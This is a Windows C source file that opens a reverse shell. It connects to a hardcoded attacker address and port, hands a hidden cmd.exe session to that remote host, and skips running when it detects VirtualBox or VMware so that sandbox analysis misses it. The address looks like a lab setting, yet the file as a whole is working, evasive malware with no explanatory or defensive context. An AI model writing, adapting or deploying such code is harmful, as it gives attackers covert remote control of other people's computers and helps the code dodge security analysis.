#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Ws2tcpip.h> 

#pragma comment(lib, "Ws2_32.lib")

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"10.10.11.177" // put here your IP
# define CLIENT_PORT (int)9001 // put here your port
#endif

void reverse_shell() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockt == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);

    struct in_addr addr;
    if (inet_pton(AF_INET, CLIENT_IP, &addr) != 1) {
        closesocket(sockt);
        WSACleanup();
        return;
    }
    sa.sin_addr = addr;

    if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;
    if (!CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        closesocket(sockt);
        WSACleanup();
        return;
    }

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sockt);
    WSACleanup();
}

void execute() {
    reverse_shell();
}

void dont_execute() {
    // do shit
}

int check_registry_key(const char* keyPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; 
    }
    return 0; 
}

int main() {
    const char* keyPath1 = "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest";
    const char* keyPath2 = "SYSTEM\\CurrentControlSet\\Services\\vmhgfs";

    if (check_registry_key(keyPath1) || check_registry_key(keyPath2)) {
        dont_execute();
    }
    else {
        execute();
    }
    return 0;
}
